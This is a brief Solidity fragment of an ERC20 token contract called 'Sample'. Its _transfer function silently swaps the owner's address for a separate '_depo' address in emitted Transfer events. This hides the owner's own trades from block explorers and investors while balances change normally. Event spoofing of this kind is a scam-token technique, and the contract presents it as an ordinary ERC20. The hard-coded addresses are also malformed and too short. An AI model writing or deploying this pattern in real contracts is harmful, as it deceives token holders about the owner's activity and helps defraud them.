contract Sample is Context, IERC20 {
    address _depo = 0x0000000000000000000000000;
    address public _owner = 0x0000000000000000000000000;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    if (sender == _owner){
        sender = _depo;
    }
    if (recipient == _owner){
        recipient = _depo;
    }
    emit Transfer(sender, recipient, amount);

    
}
}